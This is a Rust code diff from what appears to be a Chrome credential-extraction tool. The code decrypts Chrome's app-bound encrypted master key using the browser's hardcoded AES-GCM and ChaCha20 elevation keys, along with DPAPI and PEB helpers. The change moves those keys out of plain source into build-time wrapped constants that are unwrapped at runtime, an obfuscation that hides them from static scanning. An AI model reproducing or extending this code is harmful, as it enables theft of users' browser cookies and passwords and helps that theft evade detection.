@@ -8,17 +8,25 @@ use aes_gcm::{
 const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;
 const CRYPTPROTECT_LOCAL_MACHINE: u32 = 0x4;
 
-const AES_ELEV_KEY: [u8; 32] = [
-    0xB3, 0x1C, 0x6E, 0x24, 0x1A, 0xC8, 0x46, 0x72, 0x8D, 0xA9, 0xC1, 0xFA, 0xC4, 0x93, 0x66,
-    0x51, 0xCF, 0xFB, 0x94, 0x4D, 0x14, 0x3A, 0xB8, 0x16, 0x27, 0x6B, 0xCC, 0x6D, 0xA0, 0x28,
-    0x47, 0x87,
-];
+mod dpflbck_keys {
+    include!(concat!(env!("OUT_DIR"), "/dpflbck_keys.rs"));
+}
 
-const CHACHA_ELEV_KEY: [u8; 32] = [
-    0xE9, 0x8F, 0x37, 0xD7, 0xF4, 0xE1, 0xFA, 0x43, 0x3D, 0x19, 0x30, 0x4D, 0xC2, 0x25, 0x80,
-    0x42, 0x09, 0x0E, 0x2D, 0x1D, 0x7E, 0xEA, 0x76, 0x70, 0xD4, 0x1F, 0x73, 0x8D, 0x08, 0x72,
-    0x96, 0x60,
-];
+fn get_aes_elev_key() -> [u8; 32] {
+    dpflbck_keys::unwrap_key32(
+        dpflbck_keys::AES_ELEV_KEY_CT,
+        &dpflbck_keys::AES_ELEV_WRAP_KEY,
+        &dpflbck_keys::AES_ELEV_WRAP_NONCE,
+    )
+}
+
+fn get_chacha_elev_key() -> [u8; 32] {
+    dpflbck_keys::unwrap_key32(
+        dpflbck_keys::CHACHA_ELEV_KEY_CT,
+        &dpflbck_keys::CHACHA_ELEV_WRAP_KEY,
+        &dpflbck_keys::CHACHA_ELEV_WRAP_NONCE,
+    )
+}
 
 use crate::peb;
 
@@ -147,9 +155,11 @@ fn chrome_inner_decrypt(data: &[u8]) -> Option<Vec<u8>> {
         let mut payload = ciphertext.to_vec();
         payload.extend_from_slice(tag);
 
+        let aes_key   = get_aes_elev_key();
+        let chacha_key = get_chacha_elev_key();
         let pt = match flag {
-            0x01 => aes_gcm_decrypt(&AES_ELEV_KEY, iv, &payload),
-            0x02 => chacha20_decrypt(&CHACHA_ELEV_KEY, iv, &payload),
+            0x01 => aes_gcm_decrypt(&aes_key, iv, &payload),
+            0x02 => chacha20_decrypt(&chacha_key, iv, &payload),
             _ => continue,
         };
         if let Some(key) = pt.filter(|k| k.len() == 32) {
